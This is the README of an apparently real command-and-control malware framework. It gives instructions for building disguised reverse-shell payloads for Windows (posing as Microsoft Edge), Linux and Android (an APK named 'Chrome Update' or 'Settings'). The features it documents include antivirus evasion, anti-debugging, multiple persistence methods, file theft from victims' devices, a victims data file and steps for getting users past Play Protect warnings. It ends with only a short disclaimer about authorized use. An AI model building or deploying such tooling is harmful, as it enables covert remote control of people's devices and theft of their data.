# CYBERDEMONS C2 FRAMEWORK v2.0

Multi-platform C2 framework with a cyberpunk-themed web UI, supporting Windows, Linux, and Android. Features a payload builder, reverse shell generator, Android APK builder, and AV evasion.

## Features

- **Windows RCE Payload** (`pay.cpp`) — reverse shell with XOR+hex encryption, registry persistence, screenshot, file transfer, process management, `msedge.exe` masquerading
- **Linux RCE Payload** (`pay_linux.c`) — full command parity with Windows payload, 4 persistence methods, ptrace anti-debug, argv renaming, daemonization
- **Android APK Builder** — builds reverse shell APK with WebView, storage access, file download/upload, multiple connection support
- **Web C2 Listener** (`web_listener.py`) — Flask web UI with terminal, files, history, multi-port listener management
- **CLI C2 Listener** (`pythonlis.py`) — terminal listener with ANSI output, command history
- **Payload Builder** — web UI to configure C2 host/port, app name, icon upload; cross-compile Windows (MinGW) or Linux (GCC)
- **Reverse Shell Generator** (`/shells`) — 25+ one-liner payloads with built-in listener
- **Inline Netcat Listener** — start a TCP listener directly from the web UI
- **AV Bypass** — hidden console, XOR encryption, process name camouflage

## Installation

### 1. Clone the Repository

```bash
git clone <repo-url>
cd CYBERDEMONC2-
```

### 2. Install Python Dependencies

```bash
pip install flask
```

That's the only Python dependency required.

### 3. Install Windows Payload Cross-Compilation Tools (Kali/Debian)

```bash
sudo apt install -y mingw-w64 binutils-mingw-w64 x86_64-w64-mingw32-g++
```

### 4. Install Linux Payload Compilation Tools

```bash
# With X11 screenshot support:
sudo apt install -y gcc libx11-dev

# Without X11 (uses ImageMagick fallback):
sudo apt install -y gcc imagemagick libcrypt-dev
```

### 5. Install Android APK Builder Tools

The APK builder requires the Android SDK and JDK 17. These are pre-installed on the target system at:

- **JDK 17:** `/opt/jdk-17.0.2`
- **Android SDK:** `/opt/android-sdk` (platforms: android-34, build-tools: 34.0.0)

If not installed, follow these steps:

#### Install JDK 17

```bash
# Debian/Kali
sudo apt install -y openjdk-17-jdk

# Or download manually
wget https://download.java.net/java/GA/jdk17.0.2/dfd4a8d0985749f896bed50d7138ee7f/8/GPL/openjdk-17.0.2_linux-x64_bin.tar.gz
sudo tar -xzf openjdk-17.0.2_linux-x64_bin.tar.gz -C /opt/
export JAVA_HOME=/opt/jdk-17.0.2
```

#### Install Android SDK

```bash
# Create SDK directory
mkdir -p /opt/android-sdk

# Download Android command-line tools
wget https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip
unzip commandlinetools-linux-11076708_latest.zip -d /opt/android-sdk/

# Set environment
export ANDROID_HOME=/opt/android-sdk
export PATH=$PATH:$ANDROID_HOME/cmdline-tools/latest/bin

# Accept licenses and install required packages
yes | sdkmanager --licenses
sdkmanager "platforms;android-34" "build-tools;34.0.0"
```

Or if using `sdkmanager`:
```bash
sdkmanager --list                          # See available packages
sdkmanager "platforms;android-34"          # Android 14 platform
sdkmanager "build-tools;34.0.0"            # Build tools
```

#### Environment Variables (add to ~/.bashrc)

```bash
export JAVA_HOME=/opt/jdk-17.0.2
export ANDROID_HOME=/opt/android-sdk
export PATH=$PATH:$JAVA_HOME/bin:$ANDROID_HOME/build-tools/34.0.0
```

### 6. Install Netcat (for reverse shell listener)

```bash
sudo apt install -y netcat-openbsd
```

## Quick Start

```bash
cd CYBERDEMONC2-
python3 web_listener.py
```

Web UI at `http://0.0.0.0:5000`. Default C2 listener on port `7777`.

## Usage

### 1. Build a Windows/Linux Payload

**Web UI:** Open `/builder` → set C2 host/port → select platform → click Build → Download.

**Manual (Windows):**
```bash
x86_64-w64-mingw32-windres resources.rc -o resources.o
x86_64-w64-mingw32-g++ pay.cpp resources.o -o payload.exe \
  -lws2_32 -liphlpapi -lcrypt32 -lpsapi -lgdi32 -luser32 \
  -s -O2 -mwindows
```

**Manual (Linux):**
```bash
gcc -o payload.elf pay_linux.c -lX11 -lpthread -lcrypt -ldl -lm -s -O2
```

### 2. Build an Android APK

**Web UI:** Open `/android` → configure settings → click Build APK → Download.

**Command Line:**
```bash
cd apk_builder
python3 generate_apk.py \
  --c2-host YOUR_IP \
  --c2-port 8080 \
  --target-url "https://www.google.com" \
  --app-name "Chrome Update" \
  --output cyberdemon_c2.apk
```

**APK Options:**
| Option | Description | Default |
|--------|-------------|---------|
| `--c2-host` | C2 server IP/hostname | (required) |
| `--c2-port` | C2 server port | `8080` |
| `--target-url` | URL to load in WebView | `https://www.google.com` |
| `--app-name` | App name shown on device | `Settings` |
| `--icon` | Custom PNG icon path | Generated default |
| `--output` | Output APK file path | `cyberdemon_c2.apk` |
| `--package` | Android package name | `org.cyberdemon.c2` |

**Install APK:**
```bash
adb install cyberdemon_c2.apk
```

### 3. Deploy on Target

**Windows:** run `payload.exe` (console hidden, masquerades as Microsoft Edge)
**Linux:** `C2_HOST=<ip> C2_PORT=7777 ./payload.elf`

**Android:** install APK → open app → grants permissions automatically → WebView loads target URL + reverse shell connects

### 4. Control via C2

**Web UI:** Select client from sidebar → type commands in terminal → see output in real-time.

**CLI:**
```bash
python3 pythonlis.py 7777
```

## Android APK Features

### Storage Access
- `READ_EXTERNAL_STORAGE`, `WRITE_EXTERNAL_STORAGE`, `MANAGE_EXTERNAL_STORAGE`
- Auto-requests permission on first launch
- Full access to `/storage/emulated/0/`

### File Operations
- **Download from device:** `DOWNLOAD:/path/to/file` → saves to `android_clients/`
- **Upload to device:** `UPLOAD:/path/to/file` → writes file to device
- File browser in web UI with Browse, Download, Upload buttons

### Shell Features
- Working directory tracking (`cd` persists between commands)
- Each command runs in the last `cd` target directory
- Default working directory: `/storage/emulated/0`

### Multiple Connections
- Supports multiple Android devices simultaneously
- Client selector dropdown in web UI
- Each device has independent terminal + files

### WebView
- Opens configurable URL on launch
- JavaScript enabled
- Back button navigates WebView history

## Android Shell Commands

Works without root on most Android devices:

| Command | Description |
|---------|-------------|
| `id` | Current user |
| `uname -a` | System info |
| `ip addr` | IP addresses |
| `ip route` | Routing table |
| `ls -la /storage/emulated/0/` | List storage |
| `cat /proc/version` | Kernel version |
| `df -h` | Disk usage |
| `free -m` | Memory usage |
| `ps -A` | Running processes |
| `cat /proc/net/tcp` | Network connections |
| `getprop ro.product.model` | Device model |
| `getprop ro.build.version.release` | Android version |
| `settings get secure android_id` | Device ID |
| `cd /path` | Change directory (persists) |

## Payload Commands (Windows/Linux)

| Command | Windows | Linux |
|---------|---------|-------|
| `!shell <cmd>` / `<cmd>` | `cmd.exe /c` | `sh -c` |
| `!cd <dir>` | Yes | Yes |
| `!download <path>` | Yes (max 10MB) | Yes (max 10MB) |
| `!upload <path>\|<b64>` | Yes | Yes |
| `!screenshot` | Yes (GDI) | Yes (X11) |
| `!ps` | Yes | Yes |
| `!kill <pid>` | Yes | Yes |
| `!sysinfo` | Yes | Yes |
| `!persist` | Registry | systemd + cron + bashrc + XDG |
| `!exit` | Yes | Yes |

## Reverse Shell Generator (`/shells`)

25+ one-liner payloads: Bash, Python, Perl, Ruby, PHP, Node.js, PowerShell, Java, Go, Netcat, Socat, Telnet, Lua, AWK, C#.

## Communication Protocol

1. Client connects to C2 via TCP
2. Server sends commands (plaintext for Android, XOR+hex for Windows/Linux)
3. Client executes and sends response back
4. Messages delimited by newline (`\n`)

```
Windows/Linux: cmd → XOR(0x3A) → hexEncode → TCP → hexDecode → XOR(0x3A) → exec
Android:       cmd → TCP (plaintext) → exec → RESULT:data\n
```

## Project Structure

```
CYBERDEMONC2-
├── pay.cpp                  # Windows RCE payload (C++)
├── pay_linux.c              # Linux RCE payload (C)
├── pythonlis.py             # CLI C2 listener
├── web_listener.py          # Web C2 listener (Flask)
├── androidlistener.py       # CLI Android listener
├── resources.rc             # Resource script for icon
├── app.ico                  # Default payload icon
├── templates/
│   ├── index.html           # C2 web UI (clients, terminal, files)
│   ├── builder.html         # Payload builder UI
│   ├── android.html         # Android APK builder + listener UI
│   └── shells.html          # Reverse shell generator
├── static/                  # Uploaded assets
├── apk_builder/
│   ├── generate_apk.py      # APK build script
│   ├── ReverseShell.java    # Android reverse shell source
│   ├── icon.png             # Default APK icon
│   └── build/               # APK build artifacts
├── data/
│   ├── listeners.json       # Port configurations
│   └── victims.json         # Client data
├── clients/                 # Per-client file storage
├── android_clients/         # Android downloaded files
├── builder_icons/           # Uploaded .ico files
└── build_output/            # Compiled binaries
```

## Web UI Endpoints

| Route | Description |
|-------|-------------|
| `/` | C2 dashboard (clients, terminal, files) |
| `/builder` | Payload builder (Windows/Linux) |
| `/android` | Android APK builder + listener |
| `/shells` | Reverse shell generator + inline listener |

## Troubleshooting

### APK Build Fails
- Ensure JDK 17 is installed: `java -version`
- Ensure Android SDK is at `/opt/android-sdk`
- Check `build-tools/34.0.0` exists in Android SDK

### "Unsafe App" Warning on Android
- This is Google Play Protect flagging self-signed APKs
- Tap "More details" → "Install anyway"
- Or disable Play Protect temporarily in Play Store settings

### Storage Permission Denied on Android
- App auto-requests permission on first launch
- If denied, go to Settings → Apps → [App Name] → Permissions → allow Storage

### cd Command Not Working
- Ensure you're running the latest APK build
- `cd` now persists between commands

## Disclaimer

For authorized security testing and educational purposes only. Unauthorized access is illegal. The authors assume no liability for misuse.
